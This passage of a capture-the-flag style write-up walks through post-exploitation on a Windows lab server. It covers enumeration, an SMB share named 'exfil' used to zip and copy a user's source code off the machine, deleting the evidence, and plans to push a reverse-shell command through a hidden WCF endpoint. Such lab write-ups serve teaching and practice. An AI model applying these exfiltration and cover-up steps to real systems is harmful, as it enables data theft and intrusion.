</span><span class="n">Hotfix</span><span class="p">(</span><span class="n">s</span><span class="p">):</span><span class="w">                 </span><span class="mi">4</span><span class="w"> </span><span class="n">Hotfix</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="n">Installed.</span><span class="w">
                           </span><span class="p">[</span><span class="mi">01</span><span class="p">]:</span><span class="w"> </span><span class="nx">KB4580422</span><span class="w">
                           </span><span class="p">[</span><span class="mi">02</span><span class="p">]:</span><span class="w"> </span><span class="n">KB4577667</span><span class="w">
                           </span><span class="p">[</span><span class="mi">03</span><span class="p">]:</span><span class="w"> </span><span class="nx">KB4587735</span><span class="w">
                           </span><span class="p">[</span><span class="mi">04</span><span class="p">]:</span><span class="w"> </span><span class="n">KB5000822</span><span class="w">
</span><span class="nx">Network</span><span class="w"> </span><span class="nx">Card</span><span class="p">(</span><span class="n">s</span><span class="p">):</span><span class="w">           </span><span class="mi">1</span><span class="w"> </span><span class="n">NIC</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="n">Installed.</span><span class="w">
                           </span><span class="p">[</span><span class="mi">01</span><span class="p">]:</span><span class="w"> </span><span class="nx">vmxnet3</span><span class="w"> </span><span class="nx">Ethernet</span><span class="w"> </span><span class="nx">Adapter</span><span class="w">
                                 </span><span class="n">Connection</span><span class="w"> </span><span class="nx">Name:</span><span class="w"> </span><span class="nx">Ethernet0</span><span class="w">
                                 </span><span class="n">DHCP</span><span class="w"> </span><span class="nx">Enabled:</span><span class="w">    </span><span class="nx">No</span><span class="w">
                                 </span><span class="n">IP</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="n">es</span><span class="p">)</span><span class="w">
                                 </span><span class="p">[</span><span class="mi">01</span><span class="p">]:</span><span class="w"> </span><span class="mf">10.10</span><span class="o">.</span><span class="nf">10</span><span class="o">.</span><span class="nf">219</span><span class="w">
                                 </span><span class="p">[</span><span class="mi">02</span><span class="p">]:</span><span class="w"> </span><span class="n">fe80::391e:6be2:5ddb:3e5a</span><span class="w">
                                 </span><span class="p">[</span><span class="mi">03</span><span class="p">]:</span><span class="w"> </span><span class="nx">dead:beef::391e:6be2:5ddb:3e5a</span><span class="w">
</span><span class="n">Hyper-V</span><span class="w"> </span><span class="nx">Requirements:</span><span class="w">      </span><span class="nx">A</span><span class="w"> </span><span class="nx">hypervisor</span><span class="w"> </span><span class="nx">has</span><span class="w"> </span><span class="nx">been</span><span class="w"> </span><span class="nx">detected.</span><span class="w"> </span><span class="nx">Features</span><span class="w"> </span><span class="nx">required</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">Hyper-V</span><span class="w"> </span><span class="nx">will</span><span class="w"> </span><span class="nx">not</span><span class="w"> </span><span class="nx">be</span><span class="w"> </span><span class="nx">displayed.</span><span class="w">
</span></pre></table></code></div></div><p>64-bit Microsoft Windows Server 2019 Datacenter running in VMWare</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="err">&gt;</span><span class="nx">cmd</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="nx">set</span><span class="w">
</span><span class="n">ALLUSERSPROFILE</span><span class="o">=</span><span class="n">C:\ProgramData</span><span class="w">
</span><span class="nx">APPDATA</span><span class="o">=</span><span class="n">C:\Users\lars\AppData\Roaming</span><span class="w">
</span><span class="nx">CommonProgramFiles</span><span class="o">=</span><span class="n">C:\Program</span><span class="w"> </span><span class="nx">Files\Common</span><span class="w"> </span><span class="nx">Files</span><span class="w">
</span><span class="n">CommonProgramFiles</span><span class="p">(</span><span class="n">x86</span><span class="p">)</span><span class="o">=</span><span class="n">C:\Program</span><span class="w"> </span><span class="nx">Files</span><span class="w"> </span><span class="p">(</span><span class="n">x86</span><span class="p">)</span><span class="n">\Common</span><span class="w"> </span><span class="nx">Files</span><span class="w">
</span><span class="n">CommonProgramW6432</span><span class="o">=</span><span class="n">C:\Program</span><span class="w"> </span><span class="nx">Files\Common</span><span class="w"> </span><span class="nx">Files</span><span class="w">
</span><span class="n">COMPUTERNAME</span><span class="o">=</span><span class="n">SHARP</span><span class="w">
</span><span class="nx">ComSpec</span><span class="o">=</span><span class="n">C:\Windows\system32\cmd.exe</span><span class="w">
</span><span class="nx">DriverData</span><span class="o">=</span><span class="n">C:\Windows\System32\Drivers\DriverData</span><span class="w">
</span><span class="nx">HOMEDRIVE</span><span class="o">=</span><span class="n">C:</span><span class="w">
</span><span class="nx">HOMEPATH</span><span class="o">=</span><span class="n">\Users\lars</span><span class="w">
</span><span class="nx">LOCALAPPDATA</span><span class="o">=</span><span class="n">C:\Users\lars\AppData\Local</span><span class="w">
</span><span class="nx">LOGONSERVER</span><span class="o">=</span><span class="n">\\SHARP</span><span class="w">
</span><span class="nx">NUMBER_OF_PROCESSORS</span><span class="o">=</span><span class="mi">2</span><span class="w">
</span><span class="n">OS</span><span class="o">=</span><span class="n">Windows_NT</span><span class="w">
</span><span class="nx">Path</span><span class="o">=</span><span class="n">C:\Windows\system32</span><span class="p">;</span><span class="n">C:\Windows</span><span class="p">;</span><span class="n">C:\Windows\System32\Wbem</span><span class="p">;</span><span class="n">C:\Windows\System32\WindowsPowerShell\v1.0\</span><span class="p">;</span><span class="n">C:\Windows\System32\OpenSSH\</span><span class="p">;</span><span class="n">C:\Program</span><span class="w"> </span><span class="nx">Files\Redis\</span><span class="p">;</span><span class="n">C:\Users\lars\AppData\Local\Microsoft\WindowsApps</span><span class="w">
</span><span class="nx">PATHEXT</span><span class="o">=.</span><span class="nf">COM</span><span class="p">;</span><span class="o">.</span><span class="nf">EXE</span><span class="p">;</span><span class="o">.</span><span class="nf">BAT</span><span class="p">;</span><span class="o">.</span><span class="nf">CMD</span><span class="p">;</span><span class="o">.</span><span class="nf">VBS</span><span class="p">;</span><span class="o">.</span><span class="nf">VBE</span><span class="p">;</span><span class="o">.</span><span class="nf">JS</span><span class="p">;</span><span class="o">.</span><span class="nf">JSE</span><span class="p">;</span><span class="o">.</span><span class="nf">WSF</span><span class="p">;</span><span class="o">.</span><span class="nf">WSH</span><span class="p">;</span><span class="o">.</span><span class="nf">MSC</span><span class="p">;</span><span class="o">.</span><span class="nf">CPL</span><span class="w">
</span><span class="n">PROCESSOR_ARCHITECTURE</span><span class="o">=</span><span class="n">AMD64</span><span class="w">
</span><span class="nx">PROCESSOR_IDENTIFIER</span><span class="o">=</span><span class="n">AMD64</span><span class="w"> </span><span class="nx">Family</span><span class="w"> </span><span class="nx">23</span><span class="w"> </span><span class="nx">Model</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nx">Stepping</span><span class="w"> </span><span class="nx">2</span><span class="p">,</span><span class="w"> </span><span class="nx">AuthenticAMD</span><span class="w">
</span><span class="n">PROCESSOR_LEVEL</span><span class="o">=</span><span class="mi">23</span><span class="w">
</span><span class="n">PROCESSOR_REVISION</span><span class="o">=</span><span class="mi">0102</span><span class="w">
</span><span class="n">ProgramData</span><span class="o">=</span><span class="n">C:\ProgramData</span><span class="w">
</span><span class="nx">ProgramFiles</span><span class="o">=</span><span class="n">C:\Program</span><span class="w"> </span><span class="nx">Files</span><span class="w">
</span><span class="n">ProgramFiles</span><span class="p">(</span><span class="n">x86</span><span class="p">)</span><span class="o">=</span><span class="n">C:\Program</span><span class="w"> </span><span class="nx">Files</span><span class="w"> </span><span class="p">(</span><span class="n">x86</span><span class="p">)</span><span class="w">
</span><span class="n">ProgramW6432</span><span class="o">=</span><span class="n">C:\Program</span><span class="w"> </span><span class="nx">Files</span><span class="w">
</span><span class="n">PROMPT</span><span class="o">=</span><span class="nv">$P$G</span><span class="w">
</span><span class="n">PSModulePath</span><span class="o">=</span><span class="n">C:\Users\lars\Documents\WindowsPowerShell\Modules</span><span class="p">;</span><span class="n">C:\Program</span><span class="w"> </span><span class="nx">Files\WindowsPowerShell\Modules</span><span class="p">;</span><span class="n">C:\Windows\system32\WindowsPowerShell\v1.0\Modules</span><span class="w">
</span><span class="nx">PUBLIC</span><span class="o">=</span><span class="n">C:\Users\Public</span><span class="w">
</span><span class="nx">SystemDrive</span><span class="o">=</span><span class="n">C:</span><span class="w">
</span><span class="nx">SystemRoot</span><span class="o">=</span><span class="n">C:\Windows</span><span class="w">
</span><span class="nx">TEMP</span><span class="o">=</span><span class="n">C:\Users\lars\AppData\Local\Temp</span><span class="w">
</span><span class="nx">TMP</span><span class="o">=</span><span class="n">C:\Users\lars\AppData\Local\Temp</span><span class="w">
</span><span class="nx">USERDOMAIN</span><span class="o">=</span><span class="n">SHARP</span><span class="w">
</span><span class="nx">USERDOMAIN_ROAMINGPROFILE</span><span class="o">=</span><span class="n">SHARP</span><span class="w">
</span><span class="nx">USERNAME</span><span class="o">=</span><span class="n">lars</span><span class="w">
</span><span class="nx">USERPROFILE</span><span class="o">=</span><span class="n">C:\Users\lars</span><span class="w">
</span><span class="nx">windir</span><span class="o">=</span><span class="n">C:\Windows</span><span class="w">
</span></pre></table></code></div></div><p>I was signed in as <code class="language-plaintext highlighter-rouge">lars</code>; openssh and redis are in $PATH</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="err">&gt;</span><span class="nx">cd</span><span class="w"> </span><span class="nx">Documents</span><span class="w">
</span><span class="n">PS</span><span class="err">&gt;</span><span class="nx">ls</span><span class="w">


    </span><span class="n">Directory:</span><span class="w"> </span><span class="nx">C:\Users\lars\Documents</span><span class="w">


</span><span class="n">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">
</span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">
</span><span class="n">d-----</span><span class="w">       </span><span class="nx">11/15/2020</span><span class="w">   </span><span class="nx">1:40</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">wcf</span><span class="w">
</span><span class="n">PS</span><span class="err">&gt;</span><span class="nx">ls</span><span class="w">


    </span><span class="n">Directory:</span><span class="w"> </span><span class="nx">C:\Users\lars\Documents\wcf</span><span class="w">


</span><span class="n">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">
</span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">
</span><span class="n">d-----</span><span class="w">       </span><span class="nx">11/15/2020</span><span class="w">   </span><span class="nx">1:40</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="o">.</span><span class="nf">vs</span><span class="w">
</span><span class="nx">d-----</span><span class="w">       </span><span class="nx">11/15/2020</span><span class="w">   </span><span class="nx">1:40</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Client</span><span class="w">
</span><span class="n">d-----</span><span class="w">       </span><span class="nx">11/15/2020</span><span class="w">   </span><span class="nx">1:40</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">packages</span><span class="w">
</span><span class="n">d-----</span><span class="w">       </span><span class="nx">11/15/2020</span><span class="w">   </span><span class="nx">1:40</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">RemotingLibrary</span><span class="w">
</span><span class="n">d-----</span><span class="w">       </span><span class="nx">11/15/2020</span><span class="w">   </span><span class="nx">1:41</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Server</span><span class="w">
</span><span class="nt">-a</span><span class="o">----</span><span class="w">       </span><span class="mi">11</span><span class="n">/15/2020</span><span class="w">  </span><span class="nx">12:47</span><span class="w"> </span><span class="nx">PM</span><span class="w">           </span><span class="nx">2095</span><span class="w"> </span><span class="nx">wcf.sln</span><span class="w">
</span></pre></table></code></div></div><p>In <code class="language-plaintext highlighter-rouge">lars</code>’ Documents folder was somehing called wcf. This folder contained yet another project that looked like it may have been the same as the other at first</p><h3 id="file-exfiltration">File exfiltration</h3><ul><li>https://www.technig.com/share-files-using-command-line/</ul><p>I wanted to create a shared folder from the <code class="language-plaintext highlighter-rouge">wcf</code> folder so I could copy everything over at once.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="err">&gt;</span><span class="nx">New-SmbShare</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">exfil</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\Users\lars\Documents\wcf</span><span class="w"> </span><span class="nt">-FullAccess</span><span class="w"> </span><span class="nx">lars</span><span class="w">
</span><span class="n">PS</span><span class="err">&gt;</span><span class="nx">net</span><span class="w"> </span><span class="nx">share</span><span class="w">

</span><span class="n">Share</span><span class="w"> </span><span class="nx">name</span><span class="w">   </span><span class="nx">Resource</span><span class="w">                        </span><span class="nx">Remark</span><span class="w">

</span><span class="o">-------------------------------------------------------------------------------</span><span class="w">
</span><span class="n">C</span><span class="err">$</span><span class="w">           </span><span class="nx">C:\</span><span class="w">                             </span><span class="nx">Default</span><span class="w"> </span><span class="nx">share</span><span class="w">
</span><span class="n">IPC</span><span class="err">$</span><span class="w">                                         </span><span class="nx">Remote</span><span class="w"> </span><span class="nx">IPC</span><span class="w">
</span><span class="n">ADMIN</span><span class="err">$</span><span class="w">       </span><span class="nx">C:\Windows</span><span class="w">                      </span><span class="nx">Remote</span><span class="w"> </span><span class="nx">Admin</span><span class="w">
</span><span class="n">dev</span><span class="w">          </span><span class="nx">C:\dev</span><span class="w">
</span><span class="n">kanban</span><span class="w">       </span><span class="nx">C:\kanban</span><span class="w">
</span><span class="n">The</span><span class="w"> </span><span class="nx">command</span><span class="w"> </span><span class="nx">completed</span><span class="w"> </span><span class="nx">successfully.</span><span class="w">
</span></pre></table></code></div></div><p>I tried creating a new shared folder from the code folder, but it must have failed (stderr was not visible to me in this shell).</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="err">&gt;</span><span class="nx">net</span><span class="w"> </span><span class="nx">share</span><span class="w"> </span><span class="nx">exfil</span><span class="o">=</span><span class="n">C:\Users\lars\Documents\wcf</span><span class="w"> </span><span class="nx">/grant:lars</span><span class="p">,</span><span class="nx">full</span><span class="w">
</span></pre></table></code></div></div><p>I also tried it using the net share command, but was again unsuccessful</p><ul><li>https://www.howtogeek.com/670314/how-to-zip-and-unzip-files-using-powershell/</ul><p>I wanted to transfer the whole folder, but wasnt sure how to do that in my powershell reverse shell, so I zipped the folder up so I only had one file to download</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="err">&gt;</span><span class="nx">Compress-Archive</span><span class="w"> </span><span class="nt">-LiteralPath</span><span class="w"> </span><span class="nx">C:\Users\lars\Documents\wcf</span><span class="w"> </span><span class="nt">-DestinationPath</span><span class="w"> </span><span class="nx">C:\dev\wcf.zip</span><span class="w">
</span></pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sharp-17-exfil.png" alt="A sign in window promptin for lars' credentials to the dev share from my attack VM" /></p><p>Next I connected to the share on my windows machine and put in lars credentials.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sharp-18-exfil2.png" alt="The dev share's files visible from my Windows attack machine" /></p><p>After I transfered the file to my machine I deleted the evidence from the shared drive</p><h3 id="wcf">wcf</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sharp-19-wcf-client.png" alt="The client source code held another secret endpoint to connect to" /></p><p>I loaded the wcf solution in Visual Studio and opened the code for the client. There was a new “secret” TCP endpoint visible <code class="language-plaintext highlighter-rouge">net.tcp://localhost:8889/wcf/NewSecretWcfEndpoint</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sharp-20-remotingLibrary.png" alt="This version of the Remoting Library contained a method for invoking PowerShell commands" /></p><p>In this project was also a new version of the RemotingLibrary. This one contained methods for getting usage nformation about the machine such as users, CPU, and Ram. There was also an interesting method that looked like it could be used to run powershell commands.</p><div class="language-cs highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="n">client</span><span class="p">.</span><span class="nf">GetDiskInfo</span><span class="p">());</span>
            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="n">client</span><span class="p">.</span><span class="nf">GetCpuInfo</span><span class="p">());</span>
            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="n">client</span><span class="p">.</span><span class="nf">GetRamInfo</span><span class="p">());</span>
</pre></table></code></div></div><p>The client implementation of the methods only included getting the CPU, Disk, and Ram information. There wasn’t any usage of the GetUser or PowerShell commands methods.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sharp-21-wcf-client2.png" alt="My edits of the source code for the Client. I added implementation of the unused functions" /></p><p>I decided to add my own implementation of these unused methods. I inserted the same PowerShell command I had used to get a reverse shell earlier. Before I built the project, I decided to check the victim machine to see whether there was a server implementation running that would accept my commands, or whether I would have to run it myself.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="err">&gt;</span><span class="nx">netstat</span><span class="w"> </span><span class="nt">-nao</span><span class="w">

</span><span class="n">Active</span><span class="w"> </span><span class="nx">Connections</span><span class="w">

  </span><span class="n">Proto</span><span class="w">  </span><span class="nx">Local</span><span class="w"> </span><span class="nx">Address</span><span class="w">          </span><span class="nx">Foreign</span><span class="w"> </span><span class="nx">Address</span><span class="w">        </span><span class="nx">State</span><span class="w">           </span><span class="nx">PID</span><span class="w">
  </span><span class="n">TCP</span><span class="w">    </span><span class="nx">0.0.0.0:135</span><span class="w">            </span><span class="nx">0.0.0.0:0</span><span class="w">              </span><span class="nx">LISTENING</span><span class="w">       </span><span class="nx">872</span><span class="w">
  </span><span class="n">TCP</span><span class="w">    </span><span class="nx">0.0.0.0:445</span><span class="w">            </span><span class="nx">0.0.0.0:0</span><span class="w">              </span><span class="nx">LISTENING</span><span class="w">       </span><span class="nx">4</span><span class="w">
  </span><span class="n">TCP</span><span class="w">    </span><span class="nx">0.0.0.0:5985</span><span class="w">           </span><span class="nx">0.0.0.0:0</span><span class="w">              </span><span class="nx">LISTENING</span><span class="w">       </span><span class="nx">4</span><span class="w">
  </span><span class="n">TCP</span><span class="w">    </span><span class="nx">0.0.0.0:8888</span><span class="w">           </span><span class="nx">0.0.0.0:0</span><span class="w">              </span><span class="nx">LISTENING</span><span class="w">       </span><span class="nx">948</span><span class="w">
  </span><span class="n">TCP</span><span class="w">    </span><span class="nx">0.0.0.0:8889</span><span class="w">           </span><span class="nx">0.0.0.0:0</span><span class="w">              </span><span class="nx">LISTENING</span><span class="w">       </span><span class="nx">756</span><span class="w">
  </span><span class="n">TCP</span><span class="w">    </span><span class="nx">0.0.0.0:47001</span><span class="w">          </span><span class="nx">0.0.0.0:0</span><span class="w">              </span><span class="nx">LISTENING</span><span class="w">       </span><span class="nx">4</span><span class="w">
  </span><span class="n">TCP</span><span class="w">    </span><span class="nx">0.0.0.0:49664</span><span class="w">          </span><span class="nx">0.0.0.0:0</span><span class="w">              </span><span class="nx">LISTENING</span><span class="w">       </span><span class="nx">484</span><span class="w">
  </span><span class="n">TCP</span><span class="w">    </span><span class="nx">0.0.0.0:49665</span><span class="w">          </span><span class="nx">0.0.0.0:0</span><span class="w">              </span><span class="nx">LISTENING</span><span class="w">       </span><span class="nx">340</span><span class="w">
  </span><span class="n">TCP</span><span class="w">    </span><span class="nx">0.0.0.0:49666</span><span class="w">          </span><span class="nx">0.0.0.0:0</span><span class="w">              </span><span class="nx">LISTENING</span><span class="w">       </span><span class="nx">1064</span><span class="w">
  </span><span class="n">TCP</span><span class="w">    </span><span class="nx">0.0.0.0:49667</span><span class="w">          </span><span class="nx">0.0.0.0:0</span><span class="w">              </span><span class="nx">LISTENING</span><span class="w">       </span><span class="nx">620</span><span class="w">
  </span><span class="n">TCP</span><span class="w">    </span><span class="nx">0.0.0.0:49668</span><span class="w">          </span><span class="nx">0.0.0.0:0</span><span class="w">              </span><span class="nx">LISTENING</span><span class="w">       </span><span class="nx">628</span><span class="w">
  </span><span class="n">TCP</span><span class="w">    </span><span class="nx">10.10.10.219:139</span><span class="w">       </span><span class="nx">0.0.0.0:0</span><span class="w">              </span><span class="nx">LISTENING</span><span class="w">       </span><span class="nx">4</span><span class="w">
  </span><span class="n">TCP</span><span class="w">    </span><span class="nx">10.10.10.219:445</span><span class="w">       </span><span class="nx">10.10.14.172:61954</span><span class="w">     </span><span class="nx">ESTABLISHED</span><span class="w">     </span><span class="nx">4</span><span class="w">
  </span><span class="n">TCP</span><span class="w">    </span><span class="nx">10.10.10.219:49742</span><span class="w">     </span><span class="nx">10.10.14.172:9000</span><span class="w">      </span><span class="nx">ESTABLISHED</span><span class="w">     </span><span class="nx">3508</span><span class="w">
  </span><span class="n">TCP</span><span class="w">    </span><span class="p">[::]:</span><span class="nx">135</span><span class="w">               </span><span class="p">[::]:</span><span class="nx">0</span><span class="w">                 </span><span class="nx">LISTENING</span><span class="w">       </span><span class="nx">872</span><span class="w">
  </span><span class="n">TCP</span><span class="w">    </span><span class="p">[::]:</span><span class="nx">445</span><span class="w">               </span><span class="p">[::]:</span><span class="nx">0</span><span class="w">                 </span><span class="nx">LISTENING</span><span class="w">       </span><span class="nx">4</span><span class="w">
  </span><span class="n">TCP</span><span class="w">    </span><span class="p">[::]:</span><span class="nx">5985</span><span class="w">              </span><span class="p">[::]:</span><span class="nx">0</span><span class="w">                 </span><span class="nx">LISTENING</span><span class="w">       </span><span class="nx">4</span><span class="w">
  </span><span class="n">TCP</span><span class="w">    </span><span class="p">[::]:</span><span class="nx">47001</span><span class="w">             </span><span class="p">[::]:</span><span class="nx">0</span><span class="w">                 </span><span class="nx">LISTENING</span><span class="w">       </span><span class="nx">4</span><span class="w">
  </span><span class="n">TCP</span><span class="w">    </span><span class="p">[::]:</span><span class="nx">49664</span><span class="w">             </span><span class="p">[::]:</span><span class="nx">0</span><span class="w">                 </span><span class="nx">LISTENING</span><span class="w">       </span><span class="nx">484</span><span class="w">
  </span><span class="n">TCP</span><span class="w">    </span><span class="p">[::]:</span><span class="nx">49665</span><span class="w">             </span><span class="p">[::]:</span><span class="nx">0</span><span class="w">                 </span><span class="nx">LISTENING</span><span class="w">       </span><span class="nx">340</span><span class="w">
  </span><span class="n">TCP</span><span class="w">    </span><span class="p">[::]:</span><span class="nx">49666</span><span class="w">             </span><span class="p">[::]:</span><span class="nx">0</span><span class="w">                 </span><span class="nx">LISTENING</span><span class="w">       </span><span class="nx">1064</span><span class="w">
  </span><span class="n">TCP</span><span class="w">    </span><span class="p">[::]:</span><span class="nx">49667</span><span class="w">             </span><span class="p">[::]:</span><span class="nx">0</span><span class="w">                 </span><span class="nx">LISTENING</span><span class="w">       </span><span class="nx">620</span><span class="w">
  </span><span class="n">TCP</span><span class="w">    </span><span class="p">[::]:</span><span class="nx">49668</span><span class="w">             </span><span class="p">[::]:</span><span class="nx">0</span><span class="w">                 </span><span class="nx">LISTENING</span><span class="w">       </span><span class="nx">628</span><span class="w">
  </span><span class="n">UDP</span><span class="w">    </span><span class="nx">0.0.0.0:123</span><span class="w">            </span><span class="o">*</span><span class="p">:</span><span class="o">*</span><span class="w">                                    </span><span class="nx">1672</span><span class="w">
  </span><span class="n">UDP</span><span class="w">    </span><span class="nx">0.0.0.0:500</span><span class="w">            </span><span class="o">*</span><span class="p">:</span><span class="o">*</span><span class="w">                                    </span><span class="nx">1568</span><span class="w">
  </span><span class="n">UDP</span><span class="w">    </span><span class="nx">0.0.0.0:4500</span><span class="w">           </span><span class="o">*</span><span class="p">:</span><span class="o">*</span><span class="w">                                    </span><span class="nx">1568</span><span class="w">
  </span><span class="n">UDP</span><span class="w">    </span><span class="nx">10.10.10.219:137</span><span class="w">       </span><span class="o">*</span><span class="p">:</span><span class="o">*</span><span class="w">                                    </span><span class="nx">4</span><span class="w">
  </span><span class="n">UDP</span><span class="w">    </span><span class="nx">10.10.10.219:138</span><span class="w">       </span><span class="o">*</span><span class="p">:</span><span class="o">*</span><span class="w">                                    </span><span class="nx">4</span><span class="w">
  </span><span class="n">UDP</span><span class="w">    </span><span class="p">[::]:</span><span class="nx">123</span><span class="w">               </span><span class="o">*</span><span class="p">:</span><span class="o">*</span><span class="w">                                    </span><span class="nx">1672</span><span class="w">
  </span><span class="n">UDP</span><span class="w">    </span><span class="p">[::]:</span><span class="nx">500</span><span class="w">               </span><span class="o">*</span><span class="p">:</span><span class="o">*</span><span class="w">                                    </span><span class="nx">1568</span><span class="w">
  </span><span class="n">UDP</span><span class="w">    </span><span class="p">[::]:</span><span class="nx">4500</span><span class="w">              </span><span class="o">*</span><span class="p">:</span><span class="o">*</span><span class="w">                                    </span><span class="nx">1568</span><span class="w">
</span></pre></table></code></div></div><p>Since I knew that this endpoint ran on port 8889, I was able to pick out the process ID that was associated with that port</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="err">&gt;</span><span class="nx">Get-Process</span><span class="w">

</span><span class="n">Handles</span><span class="w">  </span><span class="nx">NPM</span><span class="p">(</span><span class="n">K</span><span class="p">)</span><span class="w">    </span><span class="n">PM</span><span class="p">(</span><span class="n">K</span><span class="p">)</span><span class="w">      </span><span class="n">WS</span><span class="p">(</span><span class="n">K</span><span class="p">)</span><span class="w">     </span><span class="n">CPU</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w">     </span><span class="n">Id</span><span class="w">  </span><span class="nx">SI</span><span class="w"> </span><span class="nx">ProcessName</span><span class="w">
</span><span class="o">-------</span><span class="w">  </span><span class="o">------</span><span class="w">    </span><span class="o">-----</span><span class="w">      </span><span class="o">-----</span><span class="w">     </span><span class="o">------</span><span class="w">     </span><span class="o">--</span><span class="w">  </span><span class="o">--</span><span class="w"> </span><span class="o">-----------</span><span class="w">
     </span><span class="mi">85</span><span class="w">       </span><span class="mi">5</span><span class="w">      </span><span class="mi">928</span><span class="w">       </span><span class="mi">4164</span><span class="w">              </span><span class="mi">1524</span><span class="w">   </span><span class="mi">0</span><span class="w"> </span><span class="n">CExecSvc</span><span class="w">
     </span><span class="nx">73</span><span class="w">       </span><span class="nx">5</span><span class="w">     </span><span class="nx">2240</span><span class="w">       </span><span class="nx">3776</span><span class="w">       </span><span class="nx">0.13</span><span class="w">   </span><span class="nx">2552</span><span class="w">   </span><span class="nx">1</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
     </span><span class="mi">73</span><span class="w">       </span><span class="mi">5</span><span class="w">     </span><span class="mi">2252</span><span class="w">       </span><span class="mi">3680</span><span class="w">       </span><span class="mf">0.00</span><span class="w">   </span><span class="mi">3288</span><span class="w">   </span><span class="mi">1</span><span class="w"> </span><span class="n">cmd</span><span class="w">
     </span><span class="nx">75</span><span class="w">       </span><span class="nx">5</span><span class="w">     </span><span class="nx">2244</span><span class="w">       </span><span class="nx">3932</span><span class="w">       </span><span class="nx">0.02</span><span class="w">   </span><span class="nx">3900</span><span class="w">   </span><span class="nx">1</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
    </span><span class="mi">162</span><span class="w">      </span><span class="mi">10</span><span class="w">     </span><span class="mi">6912</span><span class="w">       </span><span class="mi">3076</span><span class="w">       </span><span class="mf">2.13</span><span class="w">   </span><span class="mi">2520</span><span class="w">   </span><span class="mi">1</span><span class="w"> </span><span class="n">conhost</span><span class="w">
